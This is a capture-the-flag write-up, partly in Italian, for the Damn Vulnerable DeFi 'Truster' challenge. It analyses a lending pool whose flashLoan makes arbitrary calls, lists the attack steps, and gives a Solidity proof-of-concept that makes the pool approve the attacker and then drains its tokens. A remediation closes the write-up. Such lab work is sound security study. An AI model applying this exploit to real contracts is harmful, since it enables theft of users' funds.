# Challenge #3 - Truster
More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

Currently the pool has 1 million DVT tokens in balance. And you have nothing.

But don't worry, you might be able to take them all from the pool. In a single transaction.

[See the contracts](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/tree/master/src/Contracts/truster)
<br/>
[Complete the challenge](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/blob/master/test/Levels/truster/Truster.t.sol)

## Vulnerability Analysis
Il pool da la possibilità all'attaccante di "impersonificarlo" e poter chiamare qualsiasi funzione passandola come parametro, ineieme al target, `target.functionCall(data)` alla funzione flashLoan del pool stesso.

Questo apre la possibilità all'attaccante di poter chiamare approve del token DVT, con il pool come mittente, mettendo come approver l'attaccante stesso e come quantià tutto il balance del pool.

## The Exploit Path
Descrivi i passi del tuo attacco.

**Step 1**: Preparo la funziona `approve` da "iniettare" in `flashLoan`
```solidity
bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, TOKENS_IN_POOL);
```

**Step 2**: Chiamo `flashLoan` passandogli `0` come importo che voglio ricevere (così da non rischiare di rompere il controllo), come contratto di destinazione del flash loan l'indirizzo dell'attccante, come target l'address del token `dvt` (per potergli far chiamare `approve`) e come data la funzione `approve` preparata in precedenza.

**Step 3**: La funzione `flashLoan` termina e ora attacker puo' prelevare tutti i token dal pool tramite `transferFrom`.

## Proof of Concept (PoC)
```solidity
   function testExploit() public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, TOKENS_IN_POOL); // preparo la funzione da far chiamare al pool
        trusterLenderPool.flashLoan(0, address(attacker), address(dvt), data); // chiamo flashloan passandogli la funzione da far eseguire

        vm.prank(address(attacker)); // ora attacker ha il permesso di prelevare i token dal pool quindi devo impersonarlo
        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
    }
```

## Remediation (Fondamentale)
Usare
```solidity
try IFlashLoanReceiver(msg.sender).executeOperation(borrowAmount, params) returns (bool success) {
    if (!success) revert CallbackFailed();
} catch {
    revert CallbackFailed();
}
```
Qui il Pool prova a chiamare la funzione `executeOperation` sull'indirizzo che ha chiesto il prestito.

- *Il Vincolo*: Usando l'interfaccia `IFlashLoanReceiver`, il Pool non manderà mai un comando a caso (come l'approve di prima). Cercherà solo quel nome di funzione specifico (`executeOperation`).

- *L'Identità*: Chiama `msg.sender`. Questo garantisce che il Pool parli solo con chi ha iniziato l'operazione, evitando che l'attaccante usi il Pool come un burattino per colpire altri contratti.
